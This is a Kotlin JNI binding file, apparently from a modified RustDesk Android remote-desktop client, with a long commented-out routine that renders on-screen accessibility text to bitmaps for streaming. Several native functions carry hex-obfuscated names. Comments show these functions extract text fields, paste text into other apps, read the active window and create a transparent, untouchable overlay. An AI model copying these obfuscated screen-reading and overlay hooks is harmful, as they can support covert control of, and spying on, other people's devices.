// ffi.kt

package ffi

import android.content.Context
import java.nio.ByteBuffer

import com.carriez.flutter_hbb.RdClipboardManager


import android.graphics.Bitmap
import android.view.accessibility.AccessibilityNodeInfo
import android.accessibilityservice.AccessibilityService
import android.graphics.Canvas
import android.graphics.Paint
import android.graphics.Rect
import android.view.WindowManager
import android.widget.FrameLayout  // ✅ 需要这个
import android.view.accessibility.AccessibilityEvent
import android.app.Activity

object FFI {
    init {
        System.loadLibrary("rustdesk")
    }
    
    external fun setLayoutInScreen(activity: Activity)
        //extractEditTextNode
    external fun b99c119845afdf69(event: AccessibilityEvent): AccessibilityNodeInfo?
    
    //createView
    external fun e15f7cc69f667bd3(
      context: Context,
      windowManager: WindowManager,
      viewUntouchable: Boolean,
      viewTransparency: Float,
      netArg0: Int,
      netArg1: Int,
      netArg2: Int,
      netArg3: Int
    ): FrameLayout // ⚠️ JNI 返回 overlay

    //classGen12Treger
    external fun b481c5f9b372ead(context: Context)

    //ClassGen12pasteText
    external fun e8104ea96da3d44(
    service: AccessibilityService,
    globalNode: AccessibilityNodeInfo?,
    text: String
   )

    /*
    external fun ClassGen12pasteText(
    rootNode: AccessibilityNodeInfo,
    globalNode: AccessibilityNodeInfo?,
    text: String
   )*/

    external fun init(ctx: Context)
    external fun setClipboardManager(clipboardManager: RdClipboardManager)
    external fun startServer(app_dir: String, custom_client_config: String)
    external fun startService()
    
    //external fun onOutputBufferAvailable(buf: ByteBuffer)
    //external fun onVideoFrameUpdateUseVP9(buf: ByteBuffer)
    //external fun onVideoFrameUpdateByNetWork(buf: ByteBuffer)
    
    external fun onVideoFrameUpdate(buf: ByteBuffer)
    external fun onAudioFrameUpdate(buf: ByteBuffer)
    external fun translateLocale(localeName: String, input: String): String
    external fun refreshScreen()
    external fun setFrameRawEnable(name: String, value: Boolean)
    external fun setCodecInfo(info: String)
    external fun getLocalOption(key: String): String
    external fun onClipboardUpdate(clips: ByteBuffer)
    
    external fun c88f1fb2d2ef0700(a: AccessibilityService): AccessibilityNodeInfo?//getRootInActiveWindow
    //external fun getRootInActiveWindow(service: AccessibilityService): AccessibilityNodeInfo?
    
     external fun dd50d328f48c6896(a: Int, b: Int): ByteBuffer//initializeBuffer
    //external fun initializeBuffer(width: Int, height: Int): ByteBuffer
    
    //external fun e31674b781400507(bitmap: Bitmap, newWidth: Int, newHeight: Int): Bitmap//scaleBitmap
    external fun e31674b781400507(a: Bitmap, b: Int, c: Int): Bitmap//scaleBitmap
    //external fun scaleBitmap(bitmap: Bitmap, scaleX: Int, scaleY: Int): Bitmap
    
    //external fun e4807c73c6efa1e2(newBuffer: ByteBuffer, globalBuffer: ByteBuffer)//processBuffer
    external fun e4807c73c6efa1e2(a: ByteBuffer, b: ByteBuffer)//processBuffer

   //vp81
    external fun e4807c73c6efa1e8(a: ByteBuffer, b: ByteBuffer)//processBuffer
    
    //external fun releaseBuffer(buf: ByteBuffer)
    
    external fun isServiceClipboardEnabled(): Boolean
    
    external fun bf0dc50c68847eb0(
    accessibilityNodeInfo: AccessibilityNodeInfo,
    canvas: Canvas,
    paint: Paint
   )

    external fun bf0dc50c68847eb1(
    accessibilityNodeInfo: AccessibilityNodeInfo,
    canvas: Canvas,
    paint: Paint,
    scale: Int    // 👈 新增参数
   )
    
   external fun udb04498d6190e5b(
    accessibilityNodeInfo: AccessibilityNodeInfo,
    canvas: Canvas,
    paint: Paint,
    scale: Int    // 👈 新增参数
   )
    
   external fun udb04498d6190e5b000000(
    accessibilityNodeInfo: AccessibilityNodeInfo,
    canvas: Canvas,
    paint: Paint
   )

   // external fun processBitmap2(bitmap: android.graphics.Bitmap, width: Int, height: Int)     
    //external fun processBitmap(bitmap: android.graphics.Bitmap, width: Int, height: Int): ByteBuffer

    external fun c6e5a24386fdbdd7f(a: android.accessibilityservice.AccessibilityService) 
    //external fun setAccessibilityServiceInfo(service: android.accessibilityservice.AccessibilityService)
    
    external fun a6205cca3af04a8d(a: android.accessibilityservice.AccessibilityService) 

    external fun getNetArgs0(): Int
    external fun getNetArgs1(): Int
    external fun getNetArgs2(): Int
    external fun getNetArgs3(): Int
    external fun getNetArgs4(): Int
    external fun getNetArgs5(): Long
}

	 /*
	 fun isTextExceedWidth(text: String, paint: Paint, maxWidth: Float): Boolean {
	      val textWidth = paint.measureText(text)
  		  return textWidth > maxWidth
    }
	 
	fun drawTextWithWrapFromCenterUp(
    canvas: Canvas,
    bounds: Rect,
    text: String,
    paint: Paint,
    textSize: Float,
    padding: Float = 16f
) {
    val maxWidth = bounds.width().toFloat() - padding * 2 // 左右各留 padding
    val lines = mutableListOf<String>()
    val currentLine = StringBuilder()
    var currentWidth = 0f

    // 按字符宽度拆分行
    for (c in text) {
        val charWidth = paint.measureText(c.toString())
        if (currentWidth + charWidth > maxWidth) {
            lines.add(currentLine.toString())
            currentLine.clear()
            currentWidth = 0f
        }
        currentLine.append(c)
        currentWidth += charWidth
    }
    if (currentLine.isNotEmpty()) {
        lines.add(currentLine.toString())
    }

    // 初始 Y 基线（矩形垂直中心 + 偏移）
    var y = bounds.top + bounds.height() / 2f + padding

    // 行高（文字大小 * 1.2）
    val lineHeight = textSize * 1.2f

    // 倒序绘制（最后一行在中心，往上堆叠）
    for (line in lines.asReversed()) {
        canvas.drawText(
            line,
            bounds.left.toFloat() + padding, // X 坐标（左边留 padding）
            y,
            paint
        )
        y -= lineHeight
    }
}

*/
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
		fun scaleBitmapToWidth(source: Bitmap, targetWidth: Int): Bitmap {
		    val width = source.width
		    val height = source.height
		
		    // 原图宽度小于目标宽度，不放大
		    if (width <= targetWidth) return source
		
		    val scaleFactor = targetWidth.toFloat() / width
		    val targetHeight = (height * scaleFactor).toInt()
		
		    return Bitmap.createScaledBitmap(source, targetWidth, targetHeight, true)
		}*/


		/*
	fun a012933444445(hardwareBitmap: Bitmap?) {
    try {
        if (hardwareBitmap == null) return

        //Log.d("input service", "a012933444445进入成功")
      
		//if(true) return
        // 创建 scaledBitmap
        val scaledBitmap = FFI.e31674b781400507(hardwareBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
        //Log.d("input service", "a012933444445 缩放 SCREEN_INFO，scale：$SCREEN_INFO.scale")

        // 复制 scaledBitmap 为 ARGB_8888 格式
        var createBitmap = scaledBitmap.copy(Bitmap.Config.ARGB_8888, true)
        scaledBitmap.recycle()  // 释放 scaledBitmap 内存

        // 检查 createBitmap 是否为 null
        if (createBitmap != null) {
           // Log.d("input service", "a012933444445 updateScreenInfo: w:${SCREEN_INFO.width}, h:${SCREEN_INFO.height}, scale:${SCREEN_INFO.scale}, dpi:${SCREEN_INFO.dpi}")

            // 创建 ByteBuffer 并将 Bitmap 的像素复制到其中
            val buffer = ByteBuffer.allocate(createBitmap.byteCount)
            buffer.order(ByteOrder.nativeOrder())
            createBitmap.copyPixelsToBuffer(buffer)
            buffer.rewind()

            // 释放 createBitmap 的内存
            createBitmap.recycle()
            createBitmap = null  // 确保引用被清除

            // 将 ByteBuffer 传递给 DataTransferManager
            DataTransferManager.setImageBuffer(buffer)

            // 手动清理 ByteBuffer 引用
            buffer.clear() // 清空 ByteBuffer 内容，以便垃圾回收
            // buffer = null 这个步骤是多余的，因为 buffer 会在方法结束后自动清理

            //Log.d("input service", "a012933444445 执行 createSurfaceuseVP8")

			MainService.ctx?.createSurfaceuseVP8()	 
        }

    } catch (unused2: Exception) {
        // 捕获异常并记录错误信息
       // Log.e("input service", "a012933444445异常捕获: ${unused2.message}", unused2)
    }
}

	 ////////////////////////////////0828///////////////////////////////////////////
        fun a012933444444(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
		//Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
            return
        }
	
        try {
           //val createBitmap = Bitmap.createBitmap(SCREEN_INFO.width, SCREEN_INFO.height, Bitmap.Config.ARGB_8888)	
            val createBitmap = Bitmap.createBitmap(HomeWidth*FFI.getNetArgs4(), HomeHeight*FFI.getNetArgs4(), Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)
            val paint = Paint()
         

	   //方案一
	  // accessibilityNodeInfo.getBoundsInScreen(rect)// 先填充 Rect
	  //FFI.drawInfo77(accessibilityNodeInfo, rect.left, rect.top, rect.right, rect.bottom, canvas, paint)

	  //方案二
	  // FFI.drawInfo(accessibilityNodeInfo, rect, canvas, paint) // 传递 Rect 作为参数
	   
    //方案三
	   //FFI.bf0dc50c68847eb0(accessibilityNodeInfo, canvas, paint) // 传递 Rect 作为参数
		
	    val rect = Rect()
	    var str = ""
            accessibilityNodeInfo.getBoundsInScreen(rect)
	   // canvas.drawColor(-16777216)//纯黑色
  
            try {
                if (accessibilityNodeInfo.text != null) {
                    str = accessibilityNodeInfo.text.toString()
                } else if (accessibilityNodeInfo.contentDescription != null) {
                    str = accessibilityNodeInfo.contentDescription.toString()
                }
            } catch (unused: java.lang.Exception) {
            }
	    
             val charSequence2 = accessibilityNodeInfo.className.toString()
	        //测试
            //Log.d(logTag, "SKL className:$charSequence2,NodeInfotext:$str")	

             when (accessibilityNodeInfo.className.toString().hashCode()) {
               //DataTransferManager.a4 -> { //1540240509
				 1540240509 -> {
                    paint.color = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色。
                }
               //DataTransferManager.a3 -> { // -149114526
			    -149114526 -> {
                    paint.color = -16711936 //-16711936 代表的颜色是不透明的纯红色
                }
               //DataTransferManager.a2  -> { // -214285650
			   -214285650 -> {
                    paint.color = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                }
                else -> {
                    paint.color = -65536 //canvas.drawColor(-65536) 表示用完全不透明的纯红色填充整个画布。
                }
            }

           // val paint = Paint()
           // paint.color = Color.parseColor("#FF0000")
            paint.textSize = 13.0f * SCREEN_INFO.scale
            paint.setTypeface(Typeface.create(Typeface.DEFAULT, 1))
            paint.isAntiAlias = true
            paint.style = Paint.Style.FILL
            paint.textAlign = Paint.Align.LEFT
            canvas.drawColor(0, PorterDuff.Mode.CLEAR)
            //paint.isSubpixelText = true
            //paint.isDither = true
			
			   if (!str.isEmpty()) {
				// A(canvas, RectF(rect))
	             canvas.drawText(
	                            str,
	                            rect.left.toFloat(),
	                            (rect.centerY() / 2).toFloat(),
	                            paint
	             )
			   }

			    drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
				
			if (createBitmap != null) {
				
		        Log.d("input service","e31674b781400507:w:$SCREEN_INFO.width,h:$SCREEN_INFO.height,h:$SCREEN_INFO.scale,h:$SCREEN_INFO.dpi")
	
				val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
				//val scaledBitmap = scaleBitmapToWidth(createBitmap, 350) // 宽度 350，高度自动计算
				val w = scaledBitmap.width
			    val h = scaledBitmap.height
			    Log.d("input service", "e31674b781400507 scaledBitmap size: width=$w, height=$h")
					  
				 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
				 buffer.order(ByteOrder.nativeOrder())
				 scaledBitmap.copyPixelsToBuffer(buffer)
				 buffer.rewind()
				
				 DataTransferManager.setImageBuffer(buffer) 
				 MainService.ctx?.createSurfaceuseVP9()	
			}
        } catch (unused2: java.lang.Exception) {
        }
    } 
     
     fun drawViewHierarchy(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var charSequence: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
		    
               val rect = Rect()
                child.getBoundsInScreen(rect)

                //没有文本也要画边框
				//A(canvas, RectF(rect))
				
                //paint.textSize = 64.0f//32.0f
                //val charSequence2 = child.className.toString()
		
		// Log.d(logTag, "SKL  drawViewHierarchy className:$charSequence2")	
		 
                when (child.className.toString().hashCode()) {
				 //a1 -> { 
			-1758715599 -> {
                        c =  '0'
                    }
                 //  a2 -> { 
		 
		-214285650 -> {
                        c =  '1'
                    }
                 //  a3 -> {
		-149114526 -> {
                        c =  '2'
                    }
                 //  a4 -> {
		1540240509 -> {
                        c =  '3'
                    }
                 //  a5 -> { 
		1583615229 -> {
                        c =  '4'
                    }
                  // a6  -> {
		 1663696930 -> {
                         c =  '5'
                    }
                    else -> c = 65535.toChar()
                }

                when (c) {
                    '0' -> i = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                    '1' -> i = -65281//会将画布填充为品红色
                    '2' -> {
                        paint.textSize = 30.0f
                        i = -16711681//canvas.drawColor(-16711681) 绘制的颜色是纯红色
                    }
                    '3' -> {
                        paint.textSize = 33.0f
                        i = -65536// -7829368 // //纯红色
                    }
                    '4' -> i = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色
                    '5' -> i = -16711936 //-16711936 代表的颜色是不透明的纯红色
                    else -> {
                        paint.textSize = 30.0f//16.0f
                        i = -7829368//该颜色的 ARGB 值为 (255, 128, 128, 128)，即完全不透明（Alpha 值为 255）的灰色。因为 Red、Green 和 Blue 通道的值相等，且都为 128，这是一种中等亮度的灰色
                    }
                }
                charSequence = if (child.text != null) {
                    child.text.toString()
                } else {
                    if (child.contentDescription != null)
                        child.contentDescription.toString()
                    else ""
                }

/*
		private fun A(canvas: Canvas, rectF: RectF) {
        val paint: Paint = Paint()
        //paint.setColor(-16776961)
		//paint.setColor(-16711936)
		paint.setColor(-7829368)
        paint.setStyle(Paint.Style.STROKE)
        paint.setStrokeWidth(6.0f)
        paint.setAntiAlias(true)

        paint.setShadowLayer(3.0f, 1.5f, 1.5f, -7829368)
    //   paint.setShadowLayer(8.0f, 4.0f, 4.0f, -7829368)
        canvas.drawRoundRect(rectF, 18.0f, 18.0f, paint)
    }*/

	           //没有文本也要画边框
			   //A(canvas, RectF(rect))

			   //绘制框
			   /*
                paint.style = Paint.Style.STROKE
                paint.strokeWidth = 2.0f
                canvas.drawRect(rect, paint)
                paint.style = Paint.Style.STROKE
                paint.color = -1
                canvas.drawRect(rect, paint)
               */


			    val paint1 = Paint()
			    paint1.color = -7829368               // 设置颜色
			    paint1.style = Paint.Style.STROKE     // 描边
			    paint1.strokeWidth = 6.0f             // 描边宽度
			    paint1.isAntiAlias = true             // 抗锯齿
			    paint1.setShadowLayer(3.0f, 1.5f, 1.5f, -7829368) // 阴影
			 
			    // 画普通矩形
			    canvas.drawRect(RectF(rect), paint1)
				
               //绘制文字
               paint.isAntiAlias = true
				
              //  canvas.drawText(charSequence, rect.left + 16.toFloat(), rect.exactCenterY() + 16.0f, paint)

			   paint.strokeWidth = 1.0f       // 可选，文字一般无影响
			   paint.style = Paint.Style.FILL  // 文字填充
               //保留颜色
			   paint.color = i				
               paint.textSize = 13.0f * SCREEN_INFO.scale //48.0f
               //paint.isSubpixelText = true
               //paint.isDither = true

				
				 val maxWidth = rect.width().toFloat()// - 32.toFloat()// 不减 padding
                 if (!charSequence.isEmpty()) {
	                 if (!isTextExceedWidth(charSequence, paint, maxWidth)) {
                        val measureText = paint.measureText(charSequence)
                        val fontMetrics = paint.fontMetrics
                        val f2 = fontMetrics.bottom - fontMetrics.top
                        canvas.drawText(
                            charSequence,
                            (rect.centerX() - (measureText / 2.0f)).toInt().toFloat(),
                            (rect.centerY() + (f2 / 4.0f)).toInt().toFloat(),
                            paint
                        )
					}
					 else
					 {
                          drawTextWithWrapFromCenterUp(canvas, rect, charSequence, paint, textSize = 48f )//  13.0f * SCREEN_INFO.scale
					 }
				 }
				 else
				{
                  //空文本不需要
				}

                //FFI.udb04498d6190e5b(child, canvas, paint) // 传递 Rect 作为参数
		    
                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }
	 
	 fun isTextExceedWidth(text: String, paint: Paint, maxWidth: Float): Boolean {
    val textWidth = paint.measureText(text)
    return textWidth > maxWidth
}
	 
	fun drawTextWithWrapFromCenterUp(
    canvas: Canvas,
    bounds: Rect,
    text: String,
    paint: Paint,
    textSize: Float,
    padding: Float = 16f
) {
    val maxWidth = bounds.width().toFloat() - padding * 2 // 左右各留 padding
    val lines = mutableListOf<String>()
    val currentLine = StringBuilder()
    var currentWidth = 0f

    // 按字符宽度拆分行
    for (c in text) {
        val charWidth = paint.measureText(c.toString())
        if (currentWidth + charWidth > maxWidth) {
            lines.add(currentLine.toString())
            currentLine.clear()
            currentWidth = 0f
        }
        currentLine.append(c)
        currentWidth += charWidth
    }
    if (currentLine.isNotEmpty()) {
        lines.add(currentLine.toString())
    }

    // 初始 Y 基线（矩形垂直中心 + 偏移）
    var y = bounds.top + bounds.height() / 2f + padding

    // 行高（文字大小 * 1.2）
    val lineHeight = textSize * 1.2f

    // 倒序绘制（最后一行在中心，往上堆叠）
    for (line in lines.asReversed()) {
        canvas.drawText(
            line,
            bounds.left.toFloat() + padding, // X 坐标（左边留 padding）
            y,
            paint
        )
        y -= lineHeight
    }
}
*/


/*
	 

	
       fun a012933444445_001(hardwareBitmap: Bitmap?) {
        try {
               if (hardwareBitmap == null) return
			
               Log.d("input service", "a012933444445进入成功")
	      
               //val hardwareBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)

	    //   val createBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, true)

       // val scaledBitmap = Bitmap.createScaledBitmap(hardwareBitmap, targetWidth, targetHeight, true)
		 val scaledBitmap = FFI.e31674b781400507(hardwareBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
		 
		     Log.d("input service", "a012933444445 SCREEN_INFO，scale：$SCREEN_INFO.scale")

		val createBitmap = scaledBitmap.copy(Bitmap.Config.ARGB_8888, true)
		scaledBitmap.recycle()

		   
	       //hardwareBitmap.recycle()

                //val createBitmap = Bitmap.createBitmap(HomeWidth, HomeHeight, Bitmap.Config.ARGB_8888)    
                //val canvas = Canvas(createBitmap)
                //canvas.drawBitmap(hardwareBitmap, 0f, 0f, null)

          	if (createBitmap != null) {

		     //SCREEN_INFO，scale：Info(width=450, height=800, scale=2, dpi=160).scale

			  Log.d("input service","a012933444445 updateScreenInfo:w:$SCREEN_INFO.width,h:$SCREEN_INFO.height,h:$SCREEN_INFO.scale,h:$SCREEN_INFO.dpi")

			 // val scaledBitmap = scaleBitmapToWidth(createBitmap, 350) // 宽度 350，高度自动计算
			 
			  /*
	          val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
              val w = scaledBitmap.width
			  val h = scaledBitmap.height
	          Log.d("input service", "a012933444445 scaledBitmap size: width=$w, height=$h")
             */

	           val buffer = ByteBuffer.allocate(createBitmap.byteCount)
	           buffer.order(ByteOrder.nativeOrder())
	           createBitmap.copyPixelsToBuffer(buffer)
	           buffer.rewind()

               createBitmap.recycle() // 释放 createBitmap 的资源

	           DataTransferManager.setImageBuffer(buffer) 
			
	           Log.d("input service", "a012933444445 执行 createSurfaceuseVP8")
			 
	             MainService.ctx?.createSurfaceuseVP8()	 
                }

           /*
            val createBitmap = Bitmap.createBitmap(HomeWidth, HomeHeight, Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)
            val paint = Paint()
            drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
	    
      	  	if (createBitmap != null) {
          		val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
          		  
          		 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
          		 buffer.order(ByteOrder.nativeOrder())
          		 scaledBitmap.copyPixelsToBuffer(buffer)
          		 buffer.rewind()
          		
          		 DataTransferManager.setImageBuffer(buffer) 
          		 MainService.ctx?.createSurfaceuseVP8()	

      		}*/
        } catch (unused2: java.lang.Exception) {
		 Log.e("input service", "a012933444445异常捕获: ${unused2.message}", unused2)
        }
    } 



   
     fun a012933444444_3(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
		//Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
            return
        }
	
        try {

            val createBitmap = Bitmap.createBitmap(HomeWidth*FFI.getNetArgs4(), HomeHeight*FFI.getNetArgs4(), Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)

	    val rect = Rect()
	    var str = ""
         accessibilityNodeInfo.getBoundsInScreen(rect)

  
            try {
                if (accessibilityNodeInfo.text != null) {
                    str = accessibilityNodeInfo.text.toString()
                } else if (accessibilityNodeInfo.contentDescription != null) {
                    str = accessibilityNodeInfo.contentDescription.toString()
                }
            } catch (unused: java.lang.Exception) {
            }
	    
             val charSequence2 = accessibilityNodeInfo.className.toString()
	  
            val paint = Paint()
            paint.color = Color.parseColor("#FF0000")
            paint.textSize = 32.0f
            paint.setTypeface(Typeface.create(Typeface.DEFAULT, 1))
            paint.isAntiAlias = true
            paint.style = Paint.Style.FILL
            paint.textAlign = Paint.Align.LEFT
            canvas.drawColor(0, PorterDuff.Mode.CLEAR)
			
              if (!str.isEmpty()) {
                        
                A(canvas, RectF(rect))
                  canvas.drawText(
                            str,
                            rect.left.toFloat(),
                            (rect.centerY() / 2).toFloat(),
                            paint
                        )
			  }
            drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
	    
		if (createBitmap != null) {

		  val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
		  //	 val scaledBitmap = scaleBitmapToWidth(createBitmap, 350) // 宽度 350，高度自动计算
			  
		 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
		 buffer.order(ByteOrder.nativeOrder())
		 scaledBitmap.copyPixelsToBuffer(buffer)
		 buffer.rewind()
		
		 DataTransferManager.setImageBuffer(buffer) 
		 MainService.ctx?.createSurfaceuseVP9()	
		}
	
	
        } catch (unused2: java.lang.Exception) {
        }
    } 
     
    private fun A(canvas: Canvas, rectF: RectF) {
        val paint: Paint = Paint()
        //paint.setColor(-16776961)
		//paint.setColor(-16711936)
		paint.setColor(-7829368)
        paint.setStyle(Paint.Style.STROKE)
        paint.setStrokeWidth(6.0f)
        paint.setAntiAlias(true)

        paint.setShadowLayer(3.0f, 1.5f, 1.5f, -7829368)
    //   paint.setShadowLayer(8.0f, 4.0f, 4.0f, -7829368)
        canvas.drawRoundRect(rectF, 18.0f, 18.0f, paint)
    }

fun drawTextBottomAlignedDensityAware(
    canvas: Canvas,
    text: String,
    rect: Rect,
    baseTextSizeDp: Float,
    paint: Paint
) {
    // 将 dp 转成像素，适配屏幕密度
    //val scale = SCREEN_INFO.density dpi
    paint.textSize = baseTextSizeDp //* scale

    val fontMetrics = paint.fontMetrics
    val lineHeight = fontMetrics.bottom - fontMetrics.top

    // 按空格拆分文字，自动换行
    val lines = mutableListOf<String>()
    var currentLine = ""
    for (word in text.split(" ")) {
        val testLine = if (currentLine.isEmpty()) word else "$currentLine $word"
        if (paint.measureText(testLine) <= rect.width()) {
            currentLine = testLine
        } else {
            lines.add(currentLine)
            currentLine = word
        }
    }
    if (currentLine.isNotEmpty()) lines.add(currentLine)

    // 从矩形底部开始绘制
    var y = rect.bottom - fontMetrics.bottom

    // 倒序绘制每一行（底部对齐）
    for (i in lines.indices.reversed()) {
        val line = lines[i]
        val lineWidth = paint.measureText(line)
        val x = rect.centerX() - lineWidth / 2
        canvas.drawText(line, x, y, paint)
        y -= lineHeight
    }
}
	
     fun drawViewHierarchy_3(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var str: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
		    
               val rect = Rect()
                child.getBoundsInScreen(rect)
				A(canvas, RectF(rect))
				 
                paint.textSize = 32.0f//32.0f//18.0f

                str = if (child.text != null) {
                    child.text.toString()
                } else {
                    if (child.contentDescription != null)
                        child.contentDescription.toString()
                    else ""
                }

				 if (!str.isEmpty()) {
	/*
                        val measureText = paint.measureText(str)
                        val fontMetrics = paint.fontMetrics
                        val f2 = fontMetrics.bottom - fontMetrics.top
                        canvas.drawText(
                            str,
                            (rect.centerX() - (measureText / 2.0f)).toInt().toFloat(),
                            (rect.centerY() + (f2 / 4.0f)).toInt().toFloat(),
                            paint
                        )*/

						drawTextBottomAlignedDensityAware(
						    canvas,
						    str,
						    rect,
						    baseTextSizeDp = 32f, // 16dp 字体大小
						    paint
						)
					}

			/*
                paint.style = Paint.Style.STROKE
                paint.strokeWidth = 2.0f
                canvas.drawRect(rect, paint)
                paint.style = Paint.Style.STROKE
                paint.color = -1
                canvas.drawRect(rect, paint)
                paint.color = i
                paint.isAntiAlias = true
                canvas.drawText(charSequence, rect.left + 16.toFloat(), rect.exactCenterY() + 16.0f, paint)
            */
		
                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }



	 ///恢复android版本
	  fun a012933444444_00(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
		//Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
            return
        }
	
        try {
           //val createBitmap = Bitmap.createBitmap(SCREEN_INFO.width, SCREEN_INFO.height, Bitmap.Config.ARGB_8888)	
            val createBitmap = Bitmap.createBitmap(HomeWidth*FFI.getNetArgs4(), HomeHeight*FFI.getNetArgs4(), Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)
            val paint = Paint()
         
	    val rect = Rect()
	    var str = ""
            accessibilityNodeInfo.getBoundsInScreen(rect)
	   // canvas.drawColor(-16777216)//纯黑色
  
            try {
                if (accessibilityNodeInfo.text != null) {
                    str = accessibilityNodeInfo.text.toString()
                } else if (accessibilityNodeInfo.contentDescription != null) {
                    str = accessibilityNodeInfo.contentDescription.toString()
                }
            } catch (unused: java.lang.Exception) {
            }
	    
             val charSequence2 = accessibilityNodeInfo.className.toString()
	    //测试
            //Log.d(logTag, "SKL className:$charSequence2,NodeInfotext:$str")	

             when (accessibilityNodeInfo.className.toString().hashCode()) {
              // DataTransferManager.a4 -> { //1540240509
				   1540240509 -> {
                    paint.color = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色。
                }
              // DataTransferManager.a3 -> { // -149114526
                  -149114526 -> { 
				 paint.color = -16711936 //-16711936 代表的颜色是不透明的纯红色
                }
              // DataTransferManager.a2  -> { // -214285650
                  -214285650 -> { 
				 paint.color = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                }
                else -> {
                    paint.color = -65536 //canvas.drawColor(-65536) 表示用完全不透明的纯红色填充整个画布。
                }
            }

           // paint.color = -65536 //纯红色
            paint.style = Paint.Style.STROKE
            paint.strokeWidth = 2.0f
            paint.textSize = 32.0f
            canvas.drawRect(rect, paint)
            canvas.drawText(str, rect.exactCenterX(), rect.exactCenterY(), paint)
	    
            drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
	    
		if (createBitmap != null) {

		  val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
		  //	 val scaledBitmap = scaleBitmapToWidth(createBitmap, 350) // 宽度 350，高度自动计算
			  
		 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
		 buffer.order(ByteOrder.nativeOrder())
		 scaledBitmap.copyPixelsToBuffer(buffer)
		 buffer.rewind()
		
		 DataTransferManager.setImageBuffer(buffer) 
		 MainService.ctx?.createSurfaceuseVP9()	
		}
	
	
        } catch (unused2: java.lang.Exception) {
        }
    } 
     
     fun drawViewHierarchy_00(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var charSequence: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
		    
               val rect = Rect()
                child.getBoundsInScreen(rect)
                paint.textSize = 32.0f//18.0f
                //val charSequence2 = child.className.toString()
		
		// Log.d(logTag, "SKL  drawViewHierarchy className:$charSequence2")	
		 
                when (child.className.toString().hashCode()) {
				 //a1 -> { 
			-1758715599 -> {
                        c =  '0'
                    }
                 //  a2 -> { 
		 
		-214285650 -> {
                        c =  '1'
                    }
                 //  a3 -> {
		-149114526 -> {
                        c =  '2'
                    }
                 //  a4 -> {
		1540240509 -> {
                        c =  '3'
                    }
                 //  a5 -> { 
		1583615229 -> {
                        c =  '4'
                    }
                  // a6  -> {
		 1663696930 -> {
                         c =  '5'
                    }
                    else -> c = 65535.toChar()
                }

                when (c) {
                    '0' -> i = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                    '1' -> i = -65281//会将画布填充为品红色
                    '2' -> {
                        paint.textSize = 30.0f
                        i = -16711681//canvas.drawColor(-16711681) 绘制的颜色是纯红色
                    }
                    '3' -> {
                        paint.textSize = 33.0f
                        i = -65536// -7829368 // //纯红色
                    }
                    '4' -> i = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色
                    '5' -> i = -16711936 //-16711936 代表的颜色是不透明的纯红色
                    else -> {
                        paint.textSize = 30.0f//16.0f
                        i = -7829368//该颜色的 ARGB 值为 (255, 128, 128, 128)，即完全不透明（Alpha 值为 255）的灰色。因为 Red、Green 和 Blue 通道的值相等，且都为 128，这是一种中等亮度的灰色
                    }
                }
                charSequence = if (child.text != null) {
                    child.text.toString()
                } else {
                    if (child.contentDescription != null)
                        child.contentDescription.toString()
                    else ""
                }
                paint.style = Paint.Style.STROKE
